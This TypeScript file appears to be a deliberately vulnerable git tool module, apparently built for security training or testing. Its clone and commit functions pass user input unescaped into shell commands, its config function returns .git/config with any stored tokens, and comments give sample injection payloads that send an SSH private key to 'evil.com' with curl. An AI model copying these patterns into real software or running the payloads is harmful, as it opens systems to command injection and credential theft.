import { exec } from "child_process";
import { promisify } from "util";
import { readFile } from "fs/promises";

const execAsync = promisify(exec);

/**
 * Git operations: clone, commit, push, read config
 * 
 * 🚨 VULNERABILITIES:
 * - SEC-012: Insecure Secrets Management - reads .git/config with tokens
 * - SEC-003: Input Validation - URL injection
 * - SEC-002: Command Injection - unsanitized git commands
 */
export async function gitOperations(
  action: string,
  repo?: string,
  message?: string
) {
  console.log(`Git operation: ${action}`);

  try {
    switch (action) {
      case "clone":
        return await gitClone(repo!);
      case "commit":
        return await gitCommit(message!);
      case "push":
        return await gitPush();
      case "config":
        return await gitConfig();
      case "status":
        return await gitStatus();
      default:
        throw new Error(`Unknown git action: ${action}`);
    }
  } catch (error: any) {
    console.error("Git operation error:", error);
    return {
      content: [
        {
          type: "text",
          text: `Git operation failed: ${error.message}\n\nDetails: ${error.stderr || error.stdout}`,
        },
      ],
      isError: true,
    };
  }
}

async function gitClone(repo: string) {
  // 🚨 SEC-003: Input Validation Failure
  // No validation of repository URL
  // Attacker could provide malicious URLs like:
  // - "https://evil.com/repo.git && curl evil.com/steal?data=$(cat ~/.ssh/id_rsa)"
  // - "file:///etc/passwd"
  // - URLs with embedded credentials
  
  // 🚨 SEC-002: Command Injection
  // Repository URL is directly interpolated into shell command
  const command = `git clone ${repo}`;
  
  console.log(`Cloning repository: ${repo}`);
  
  const { stdout, stderr } = await execAsync(command);

  return {
    content: [
      {
        type: "text",
        text: `Repository cloned successfully:\n\n${stdout}\n${stderr}`,
      },
    ],
  };
}

async function gitCommit(message: string) {
  // 🚨 SEC-002: Command Injection
  // Commit message is not properly escaped
  // Attacker could inject: "Initial commit\" && curl evil.com/exfiltrate"
  const command = `git add . && git commit -m "${message}"`;
  
  console.log(`Creating commit with message: ${message}`);
  
  const { stdout, stderr } = await execAsync(command);

  return {
    content: [
      {
        type: "text",
        text: `Commit created:\n\n${stdout}\n${stderr}`,
      },
    ],
  };
}

async function gitPush() {
  // 🚨 SEC-012: Insecure Secrets Management
  // Git push may expose credentials in error messages
  // If git config has https://token@github.com URLs, they'll be in logs
  const command = "git push";
  
  console.log("Pushing to remote...");
  
  const { stdout, stderr } = await execAsync(command);

  // 🚨 SEC-004: Information Disclosure
  // Push output may contain repository URLs with embedded tokens
  console.log("Push output:", stdout);
  console.log("Push stderr:", stderr);

  return {
    content: [
      {
        type: "text",
        text: `Push completed:\n\n${stdout}\n${stderr}`,
      },
    ],
  };
}

async function gitConfig() {
  // 🚨 SEC-012: CRITICAL - Insecure Secrets Management
  // Reading .git/config directly exposes:
  // - GitHub personal access tokens
  // - GitLab tokens
  // - Bitbucket app passwords
  // - Any credentials stored in remote URLs
  // Example: url = https://ghp_token123:x-oauth-basic@github.com/user/repo.git
  
  try {
    const configContent = await readFile(".git/config", "utf-8");
    
    // 🚨 SEC-004: Information Disclosure
    // Logging entire git config including potential secrets
    console.log("Git config content:", configContent);

    return {
      content: [
        {
          type: "text",
          text: `Git Configuration:\n\n${configContent}`,
        },
      ],
    };
  } catch (error: any) {
    // Also exposing error details
    return {
      content: [
        {
          type: "text",
          text: `Could not read git config: ${error.message}`,
        },
      ],
    };
  }
}

async function gitStatus() {
  const command = "git status";
  const { stdout } = await execAsync(command);

  return {
    content: [
      {
        type: "text",
        text: `Git Status:\n\n${stdout}`,
      },
    ],
  };
}